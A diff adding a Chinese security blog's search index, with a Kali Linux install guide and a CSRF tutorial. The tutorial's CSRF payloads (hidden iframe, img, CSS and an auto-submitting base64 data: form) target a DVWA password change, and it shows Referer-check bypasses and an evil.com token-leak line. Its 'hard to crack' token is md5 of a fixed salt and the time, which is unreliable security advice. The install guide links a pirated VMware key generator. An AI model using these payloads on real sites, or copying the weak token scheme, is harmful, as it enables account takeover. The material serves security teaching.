@@ -1,0 +1,1135 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Kali-2020.1b安装那些事儿</title>
+    <url>/archives/46925.html</url>
+    <content><![CDATA[<div class="note info no-icon"><h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p>Kali Linux 是许多优秀的安全工具的集合，它的目标就是为了简单：在一个实用的工具包里尽可能多的包含渗透和审计工具<br>对于专业用户来说，它有难以置信的好处，但是对于一些不怀好意的人来说，也可以产生很多大麻烦<br>小心地使用 Kali，充分利用它的巨大优势，否则，你将在某个地方（你懂的）度过你的余生<br>建议先看一下这篇文章<span class="exturl" data-url="aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTEwMTk4LTEuaHRtbA==">在你开始使用kali linux前必须要知道的事情<i class="fa fa-external-link-alt"></i></span></p>
+</div>
+
+
+<hr>
+<h1 id="1-镜像下载及相关知识"><a href="#1-镜像下载及相关知识" class="headerlink" title="1. 镜像下载及相关知识"></a>1. 镜像下载及相关知识</h1><h2 id="1-1-镜像下载地址"><a href="#1-1-镜像下载地址" class="headerlink" title="1.1 镜像下载地址"></a>1.1 镜像下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG93bmxvYWRzLw==">Kali官网下载地址<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20va2FsaS1pbWFnZXMv">阿里云镜像站<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="1-2-kali各版本介绍"><a href="#1-2-kali各版本介绍" class="headerlink" title="1.2 kali各版本介绍"></a>1.2 kali各版本介绍</h2><p>当前官网kali版本是2020.1b，有以下几种类型的文件</p>
+<div class="note info no-icon"><p>Installer：仅用于安装<br>Live：可直接使用，也用于安装<br>NetInstaller：联网安装包<br>VMware | VirtualBox：虚拟机专版</p>
+</div>
+
+<p>博主下载的的是Live版本来做的安装教程，如果使用Installer版本安装，安装过程中会让你自定义下载哪些组件，涉及到下载那就没的说了，各种问题扑面而来：</p>
+<blockquote>
+<p>第一，你不会选<br>第二，网络波动的原因也导致一些稀奇古怪的问题</p>
+</blockquote>
+<p>猛男就应该一步到位，爷都下了2.1g了你还要我下东西，我何必不直接下个2.7g的Live版本<br>另外，中文乱码的问题也是Installer版本安装的毛病，使用Live版本安装暂未出现乱码问题</p>
+<h2 id="1-3-硬盘安装"><a href="#1-3-硬盘安装" class="headerlink" title="1.3 硬盘安装"></a>1.3 硬盘安装</h2><p>扯点题外话，总有些人喜欢装实体机，拦不住，所以这里提一下<br>硬盘安装和虚拟机安装其实基本都一样，可以参考官方安装文档，不同的一步只是要制作U盘启动盘，制作工具上官方推荐Win32 Disk Imager。<br>制作U盘启动盘都是同win一样的傻瓜式操作，选择镜像文件 - 选择U盘 - 点击写入 - 等待完成即可。</p>
+<div class="note danger no-icon"><p>Win32 SDK Imanger默认只认.img文件，.img是.iso的超集，支持.img也就支持.iso所以在选择镜像文件时将过滤后辍改成*.*再选.iso即可</p>
+</div>
+
+<h1 id="2-虚拟机配置"><a href="#2-虚拟机配置" class="headerlink" title="2. 虚拟机配置"></a>2. 虚拟机配置</h1><h2 id="2-1-VMware-Workstation-Pro下载"><a href="#2-1-VMware-Workstation-Pro下载" class="headerlink" title="2.1 VMware Workstation Pro下载"></a>2.1 VMware Workstation Pro下载</h2><div class="note info no-icon"><p>官网下载的15.5.0版本，外加上不记得哪儿撸的许可证生成工具<br><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUJkVnBLNlpNajkzd0ktVkdCUkVlTWc=">百度网盘<i class="fa fa-external-link-alt"></i></span> 提取码：3vpv</p>
+</div>
+
+<h2 id="2-2-虚拟机创建及配置"><a href="#2-2-虚拟机创建及配置" class="headerlink" title="2.2 虚拟机创建及配置"></a>2.2 虚拟机创建及配置</h2><h3 id="①-创建新的虚拟机-典型-选择下载好的镜像文件"><a href="#①-创建新的虚拟机-典型-选择下载好的镜像文件" class="headerlink" title="① 创建新的虚拟机 - 典型 - 选择下载好的镜像文件"></a>① 创建新的虚拟机 - 典型 - 选择下载好的镜像文件</h3>
+
+<h3 id="②-虚拟机配置"><a href="#②-虚拟机配置" class="headerlink" title="② 虚拟机配置"></a>② 虚拟机配置</h3><p>指定系统版本这里选择Linux Debian 10.x 64位（因为Kali是基于最新版的Debian制作的，<span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy92aXJ0dWFsaXphdGlvbi9pbnN0YWxsLXZtd2FyZS13b3Jrc3RhdGlvbi1wbGF5ZXIta2FsaS1ndWVzdC12bS8=">官方文档<i class="fa fa-external-link-alt"></i></span>有写）</p>
+
+
+<p>接下来自定义虚拟机名称和虚拟机存放位置</p>
+
+
+<p>再然后来到磁盘容量分配，这里做演示只分配60g，根据个人需求自定，官方文档建议80g</p>
+
+
+<p>最后看一下自定义硬件，可以将无用硬件移除以提升系统运行效率，例如打印机等，运行内存至少分配2g，处理器核心数自定</p>
+
+
+<h1 id="3-系统安装及配置"><a href="#3-系统安装及配置" class="headerlink" title="3. 系统安装及配置"></a>3. 系统安装及配置</h1><div class="note info no-icon"><p>安装过程基本就是下一步下一步，这里只提几点需要注意的地方，其他的就不赘述了</p>
+</div>
+<h2 id="3-1-进入安装界面"><a href="#3-1-进入安装界面" class="headerlink" title="3.1 进入安装界面"></a>3.1 进入安装界面</h2><p>开启虚拟机并选择Graphical install（即图形化安装界面）</p>
+
+
+<p>首先是语言选择，直接简体中文下一步下一步就ok，然后自定义主机名，之后域名不要填直接下一步<br>新版本Kali更改默认用户为非根用户，所以这里要求我们自定义一个新用户名和密码</p>
+
+
+<h2 id="3-2-磁盘分区"><a href="#3-2-磁盘分区" class="headerlink" title="3.2 磁盘分区"></a>3.2 磁盘分区</h2><p>分区方法就用默认的，使用整个磁盘 ↓</p>
+
+
+<p>选定分区方案 ↓</p>
+
+
+<p>将改动写入磁盘 ↓</p>
+
+
+<h2 id="3-3-系统开始写入"><a href="#3-3-系统开始写入" class="headerlink" title="3.3 系统开始写入"></a>3.3 系统开始写入</h2><p>这里可以抽根烟喝口茶静待安装进程结束↓</p>
+
+
+<p>不使用网络镜像 ↓</p>
+
+
+<p>安装GRUB引导器 ↓</p>
+
+
+<p>选择引导安装设备/dev/sda ↓</p>
+
+
+<p>系统安装完成后结束安装进程，点一下继续会自动重启进入登录界面↓</p>
+
+
+<h2 id="3-4-系统配置"><a href="#3-4-系统配置" class="headerlink" title="3.4 系统配置"></a>3.4 系统配置</h2><h3 id="①-安装VMware-Tools"><a href="#①-安装VMware-Tools" class="headerlink" title="① 安装VMware Tools"></a>① 安装VMware Tools</h3><p>有了它你才能将主机文件直接复制粘贴到虚拟机上，同时窗口尺寸也可以自适应了</p>
+<ul>
+<li><p>菜单栏 虚拟机 - 安装VMware Tools↓</p>
+</li>
+<li><p>将挂载的VMware Tools中的压缩包拷贝到kali本地，比如桌面，并解压</p>
+</li>
+<li><p>打开解压出来的文件夹，右键空白处选择在此处打开终端</p>
+</li>
+<li><p>开始安装VMware Tools，键入命令后一路回车，出现 <code>Enjoy</code> 字样即安装成功，重启生效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="②-配置软件源"><a href="#②-配置软件源" class="headerlink" title="② 配置软件源"></a>② 配置软件源</h3><p>早期国内访问kali官方源简直是龟速，所以需要更换国内源达到提速效果，但现在使用官方源不知道为啥会自动引流到东软大学的镜像站，总之速度飞起，如果你非要更换其他源参照以下步骤<br>打开终端输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mousepad /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<p>以下是阿里源和官方源</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#阿里云</span><br><span class="line">#deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+<p>在不用的源前面加上’#’注释掉，修改后ctrl+s保存，地球人都知道的保存快捷键</p>
+
+
+<h3 id="③-系统更新"><a href="#③-系统更新" class="headerlink" title="③ 系统更新"></a>③ 系统更新</h3><p>修改完成后执行以下命令（初次更新过程较长，可以去抽根烟喝口茶）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade -y</span><br><span class="line">sudo apt-get dist-upgrade -y</span><br><span class="line">sudo apt-get clean</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+
+<p><code>apt-get</code>常用命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>释义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>update</td>
+<td>取回更新的软件包列表信息</td>
+</tr>
+<tr>
+<td>upgrade</td>
+<td>进行一次升级</td>
+</tr>
+<tr>
+<td>install</td>
+<td>安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb)</td>
+</tr>
+<tr>
+<td>remove</td>
+<td>卸载软件包</td>
+</tr>
+<tr>
+<td>purge</td>
+<td>卸载并清除软件包的配置</td>
+</tr>
+<tr>
+<td>autoremove</td>
+<td>卸载所有自动安装且不再使用的软件包</td>
+</tr>
+<tr>
+<td>dist-upgrade</td>
+<td>发布版升级，见 apt-get(8)</td>
+</tr>
+<tr>
+<td>dselect-upgrade</td>
+<td>根据 dselect 的选择来进行升级</td>
+</tr>
+<tr>
+<td>build-dep</td>
+<td>为源码包配置所需的编译依赖关系</td>
+</tr>
+<tr>
+<td>clean</td>
+<td>删除所有已下载的包文件</td>
+</tr>
+<tr>
+<td>autoclean</td>
+<td>删除已下载的旧包文件</td>
+</tr>
+<tr>
+<td>check</td>
+<td>核对以确认系统的依赖关系的完整性</td>
+</tr>
+<tr>
+<td>source</td>
+<td>下载源码包文件</td>
+</tr>
+<tr>
+<td>download</td>
+<td>下载指定的二进制包到当前目录</td>
+</tr>
+<tr>
+<td>changelog</td>
+<td>下载指定软件包，并显示其changelog</td>
+</tr>
+</tbody></table>
+<h1 id="4-常用软件安装及配置"><a href="#4-常用软件安装及配置" class="headerlink" title="4. 常用软件安装及配置"></a>4. 常用软件安装及配置</h1><h2 id="4-1-安装Google拼音输入法"><a href="#4-1-安装Google拼音输入法" class="headerlink" title="4.1 安装Google拼音输入法"></a>4.1 安装Google拼音输入法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx -y</span><br><span class="line">sudo apt-get install fcitx-googlepinyin -y</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+<p>重启之后按<code>ctrl+空格</code>即可切换为拼音输入法</p>
+<h2 id="4-2-FireFox切换中文"><a href="#4-2-FireFox切换中文" class="headerlink" title="4.2 FireFox切换中文"></a>4.2 FireFox切换中文</h2><p>设置中直接添加中文字体之后应用并重启Firefox就行了<br>如图：</p>
+
+
+
+
+<h2 id="4-3-安装Gdebi"><a href="#4-3-安装Gdebi" class="headerlink" title="4.3 安装Gdebi"></a>4.3 安装Gdebi</h2><p>这个软件可以自动解决软件安装的依赖问题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gdebi -y</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>整个系统安装的话就这些东西，博主目前使用的是2019.4的gnome版本，然后用更新命令更新到的最新版，主要还是习惯了gnome，虽然新版本也可以装gnome但是配置太麻烦。最近很多人安装2020.1b出现问题，所以写此文供各位师傅参考。</p>
+<p>最后附图一张博主使用的kali（日常upgrade）</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>Kali Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSRF漏洞</title>
+    <url>/archives/24515.html</url>
+    <content><![CDATA[<div class="note info no-icon"><h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p><strong>CSRF的漏洞原理</strong><br>利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</p>
+<p>例如：简单转账案例<br>初始化链接：<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL3BheS5waHA/dXNlcj14eCZhbXA7bW9uZXk9MTAw">http://www.xxx.com/pay.php?user=xx&amp;money=100<i class="fa fa-external-link-alt"></i></span><br>构造恶意链接：<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL3BheS5waHA/dXNlcj0lRTYlODElQjYlRTYlODQlOEYlRTclOTQlQTglRTYlODglQjcmYW1wO21vbmV5PTEwMDAw">http://www.xxx.com/pay.php?user=恶意用户&amp;money=10000<i class="fa fa-external-link-alt"></i></span></p>
+</div>
+
+<h1 id="一、无防护的CSRF漏洞利用"><a href="#一、无防护的CSRF漏洞利用" class="headerlink" title="一、无防护的CSRF漏洞利用"></a>一、无防护的CSRF漏洞利用</h1><h2 id="0X01-GET型CSRF利用"><a href="#0X01-GET型CSRF利用" class="headerlink" title="0X01 GET型CSRF利用"></a>0X01 GET型CSRF利用</h2><p>前面简单转账案例就是一个GET型CSRF利用<br>4种GET型CSRF利用方式：</p>
+<h3 id="1-链接利用-a标签"><a href="#1-链接利用-a标签" class="headerlink" title="1. 链接利用(a标签)"></a>1. 链接利用(a标签)</h3><p>在html中，a标签代表链接，可以将当前的“焦点”指引到其他位置，移动的“焦点”需要发送对应的请求到链接指向的地址，然后返回响应</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href =&quot;请求地址，可以携带GET型参数&quot;&gt; 内容 &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">&lt;a href =&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-iframe利用"><a href="#2-iframe利用" class="headerlink" title="2. iframe利用"></a>2. iframe利用</h3><p>iframe标签内容将在页面加载过程中自动进行加载， src指向的位置就是页面请求的位置<br>注意：可使用style=”display:none”来设置不显示iframe加载的内容<br>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot; style=&quot;display:none&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-img标签利用"><a href="#3-img标签利用" class="headerlink" title="3. img标签利用"></a>3. img标签利用</h3><p>img标签的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求。<br>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-CSS-background利用"><a href="#4-CSS-background利用" class="headerlink" title="4. CSS-background利用"></a>4. CSS-background利用</h3><p>可以利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求。<br>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body</span><br><span class="line">  &#123; </span><br><span class="line">  background: #00FF00 url(&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;) no-repeat fixed top;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-POST型CSRF利用"><a href="#0x02-POST型CSRF利用" class="headerlink" title="0x02 POST型CSRF利用"></a>0x02 POST型CSRF利用</h2><p>设置表单用于提交，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=”hidden” name=”username” value=”1111” /&gt;</span><br></pre></td></tr></table></figure>
+<p>使用burpsuite拦截POST包并生成CSRF PoC</p>
+
+
+<p>在burpsuite生成的PoC中可以看到已经使用hidden参数隐藏表单数据</p>
+
+<p>点击Test in browser会生成访问链接，实际攻击时诱使目标访问即可实现攻击</p>
+<h1 id="二、CSRF漏洞探测"><a href="#二、CSRF漏洞探测" class="headerlink" title="二、CSRF漏洞探测"></a>二、CSRF漏洞探测</h1><h2 id="0x01-手工探测"><a href="#0x01-手工探测" class="headerlink" title="0x01 手工探测"></a>0x01 手工探测</h2><p>手工探测原理就在于探测web应用程序是否具有CSRF漏洞的防御措施。</p>
+
+<p>如果Web应用程序的HTTP请求中没有对应的预防措施，那么很大程度上就确定存在CSRF漏洞。</p>
+<h2 id="0x02-自动化探测"><a href="#0x02-自动化探测" class="headerlink" title="0x02 自动化探测"></a>0x02 自动化探测</h2><p>利用自动化探测工具CSRFTester或者burpsuite自带的Generate CSRF PoC</p>
+<p>CSRFTester工具的测试原理：使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修测试的请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
+<p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，burp是8080<br>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞<br>3.生成PoC</p>
+<h1 id="三、Token防御机制"><a href="#三、Token防御机制" class="headerlink" title="三、Token防御机制"></a>三、Token防御机制</h1><h2 id="0x01-漏洞修补逻辑分析"><a href="#0x01-漏洞修补逻辑分析" class="headerlink" title="0x01 漏洞修补逻辑分析"></a>0x01 漏洞修补逻辑分析</h2><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作<br>漏洞修补逻辑分析:如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。<br>一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交</p>
+<h2 id="0x02-简单代码模型分析"><a href="#0x02-简单代码模型分析" class="headerlink" title="0x02 简单代码模型分析"></a>0x02 简单代码模型分析</h2><p>如果没有令牌，远程构造CSRF利用POC则直接中招。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF，若令牌不正确，则不执行操作，并给出提示内容。</p>
+
+
+<h2 id="0x03-使用Token进行CSRF防御"><a href="#0x03-使用Token进行CSRF防御" class="headerlink" title="0x03 使用Token进行CSRF防御"></a>0x03 使用Token进行CSRF防御</h2><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂<strong>难以破解</strong>的内容。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">	$salt = &quot;hello&quot;.date(&quot;h/i/s&quot;);</span><br><span class="line">	$token = md5($salt);</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br><span class="line">$token = generateToken();</span><br><span class="line">echo $token;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>1.登陆验证成功之后，在会话<code>SESSION[&quot;user_token&quot;]</code>中保存Token<br>2.在后台操作中，增删改表单中添加隐藏域hidden，设置value为Token<br>3.提交之后验证Token是否正确</p>
+<p>实例：<br>token_generate.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    function token_generate()</span><br><span class="line">    &#123;</span><br><span class="line">        $salt = &quot;hello&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">        $token = md5($salt);</span><br><span class="line">        return $token;</span><br><span class="line">    &#125;</span><br><span class="line">    $token = token_generate();</span><br><span class="line">    $_SESSION[&quot;user_token&quot;] = $token;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;CSRF_TOKEN&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;check.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; value=&quot;111&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&lt;?php echo $token;?&gt;&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>check.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    $user_token = $_POST[&quot;user_token&quot;];</span><br><span class="line">    if($_SESSION[&quot;user_token&quot;] == $user_token)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_SESSION[&quot;user_token&quot;];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;$user_token&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;successful&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、Referer防御机制"><a href="#四、Referer防御机制" class="headerlink" title="四、Referer防御机制"></a>四、Referer防御机制</h1><h2 id="0x01-Referer防御CSRF原理"><a href="#0x01-Referer防御CSRF原理" class="headerlink" title="0x01 Referer防御CSRF原理"></a>0x01 Referer防御CSRF原理</h2><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理<br>当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关，如果不相关则不执行操作</p>
+<h2 id="0x02-使用Referer进行CSRF防御"><a href="#0x02-使用Referer进行CSRF防御" class="headerlink" title="0x02 使用Referer进行CSRF防御"></a>0x02 使用Referer进行CSRF防御</h2><p>在PHP中使用<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>获取页面提交请求中的Referer值<br>这里需要用到一个strpos函数，用法参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX3N0cmluZ19zdHJwb3MuYXNw">PHP strpos() 函数-w3c<i class="fa fa-external-link-alt"></i></span><br>附上防御代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$referer = $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">	if(strpos($referer,&quot;192.168.150.1&quot;) !== false)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;successful&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;fail&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>strpos函数里面的意思也就是在获取的Referer值里面是否包含192.168.150.1这个域名，如果包含了说明是正确的，没包含就可能是恶意的</p>
+<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><p>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。<br>例：<br>① 利用<code>data:</code>协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	    &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">	&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://www.xxxx.com/attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><br>    attack.php写上CSRF攻击代码</p>
+<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><p>比如你找的csrf是 <code>xxx.com</code>，验证的referer是验证的 <code>*.xx.com</code>，可以找个二级域名之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code> 之后在把地址发出去就可以伪造。</p>
+<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><p>Referer判断存在不存在<code>google.com</code>这个关键词，在网站新建一个<code>google.com</code>文件夹，把CSRF PoC存放在<code>google.com</code>目录，即可绕过。</p>
+<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><p>判断了Referer开头是否以<code>126.com</code>以及126子域名  不验证根域名为 <code>126.com</code> 那么我这里可以构造子域名 <code>x.126.com.xxx.com</code> 作为蠕虫传播的载体服务器，即可绕过。</p>
+<h1 id="五、CSRF漏洞防御总结"><a href="#五、CSRF漏洞防御总结" class="headerlink" title="五、CSRF漏洞防御总结"></a>五、CSRF漏洞防御总结</h1><h2 id="0x01-验证码"><a href="#0x01-验证码" class="headerlink" title="0x01 验证码"></a>0x01 验证码</h2><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。<br>CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。通常情况下，验证码能够很好的遏制CSRF。<br>但出于用户体验考虑，不可能每一个操作都加入验证码，所以验证码只作为辅助手段，不能作为防御CSRF的主要解决方案。</p>
+<ul>
+<li>验证码防御也可以被认为是二次验证</li>
+</ul>
+<h2 id="0x02-Referer-Check"><a href="#0x02-Referer-Check" class="headerlink" title="0x02 Referer Check"></a>0x02 Referer Check</h2><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。<br>比如用户修改密码，一定是在登录系统后台之后进行操作，所以在修改提交表单的时候，一定会从系统后台页面提交，携带Referer头，如果Referer不是当前系统的域，那么极有可能遭受CSRF。</p>
+<p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
+<h2 id="0x03-Anti-CSRF-Token"><a href="#0x03-Anti-CSRF-Token" class="headerlink" title="0x03 Anti CSRF Token"></a>0x03 Anti CSRF Token</h2><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。<br>那么防御措施就是生成一个随机且不被轻易猜测的参数，目前大多数防御都采用不可预测的token值。</p>
+<p>缺陷：Token泄露<br>1.GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
+<p>2.POST型Token泄露<br>利用XSS漏洞获取其Cookie，查看存储在其中的Token值。</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VMware安装Ubuntu 20.04 LTS图解</title>
+    <url>/archives/574.html</url>
